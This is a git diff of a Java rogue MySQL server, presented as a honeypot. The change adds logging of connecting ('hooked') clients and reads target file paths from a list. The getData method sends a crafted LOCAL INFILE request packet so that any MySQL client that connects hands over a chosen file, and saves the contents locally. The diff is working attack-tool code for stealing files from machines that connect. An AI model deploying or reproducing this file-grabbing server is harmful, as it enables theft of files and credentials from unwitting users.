@@ -15,9 +15,13 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Objects;
+import java.util.logging.FileHandler;
+import java.util.logging.SimpleFormatter;
 
 public class Socket extends Thread {
     private final ServerSocket serverSocket;
+
+    private static List<String> logOutput = new ArrayList<>();
 
     public static byte[] usernameByte;
 
@@ -50,6 +54,10 @@ public class Socket extends Thread {
             try {
                 server = serverSocket.accept();
                 logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
+                logOutput.add("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
+                FileUtils.writeLines(configuration.logFileName, logOutput, true);
+                logOutput.clear();
+
                 DataInputStream in = new DataInputStream(server.getInputStream());
                 DataOutputStream out = new DataOutputStream(server.getOutputStream());
 
@@ -102,8 +110,9 @@ public class Socket extends Thread {
                     server = serverSocket.accept();
                     assert server != null;
                     ip = server.getRemoteSocketAddress().toString().substring(1);
+                    String port = ip.substring(ip.lastIndexOf(":") + 1);
                     ip = ip.substring(0, ip.lastIndexOf(":"));
-                    logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());// todo 替换为保存进日志文件中
+
                     DataInputStream in = new DataInputStream(server.getInputStream());
                     DataOutputStream out = new DataOutputStream(server.getOutputStream());
 
@@ -112,6 +121,10 @@ public class Socket extends Thread {
                         configuration.return1129(out, ip);
                         break;
                     }
+                    logger.info("[+] 已上钩的客户端: " + ip + " " + port);
+                    logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 已上钩的客户端: " + ip + " " + port);
+                    FileUtils.writeLines(configuration.logFileName, logOutput, true);
+                    logOutput.clear();
 
                     long startTime = System.currentTimeMillis();
                     out.write(stringUtils.hexToByteArray(configuration.flushVersionText())); // 发送mysql版本信息
@@ -142,10 +155,12 @@ public class Socket extends Thread {
                     bys = new byte[1024];
                     in.read(bys);
 
-                    String filename = "D:\\1.txt";
+                    configuration.wantReadList = FileUtils.readLines(".\\wantReadList.txt");
+                    String filename = configuration.wantReadList.get(0);
                     getData(filename, server);
 
-                } catch (Exception e) {
+
+                }  catch (Exception e) {
                     e.printStackTrace();
                     break;
                 } finally {
@@ -269,6 +284,11 @@ public class Socket extends Thread {
      * 蜜罐的核心攻击方式:获取客户端的某个文件
      */
     public static void getData(String filename, java.net.Socket server) throws IOException {
+        logger.info("[+] 服务端想要获取的文件为: " + filename);
+        logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 服务端想要获取的文件为: " + filename);
+        FileUtils.writeLines(configuration.logFileName, logOutput, true);
+        logOutput.clear();
+
         byte[] byte1 = new byte[]{(byte) (filename.length() + 1)};
         byte[] byte2 = {0x00, 0x00, 0x01, (byte) 0xfb};
         byte[] byte3 = filename.getBytes(StandardCharsets.UTF_8);
@@ -283,7 +303,7 @@ public class Socket extends Thread {
         out.flush();
         byte[] bys = new byte[9999];
         int bysLength = in.read(bys);
-
+        // todo 增加输出不存在文件的提示
         String getData = new String(bys, 0, bysLength);
         System.out.println("\n-----------------------------------------\n" + getData + "\n-----------------------------------------\n");
         FileWriter writer = new FileWriter("getData" + File.separator + filename.substring(filename.lastIndexOf(File.separator)));
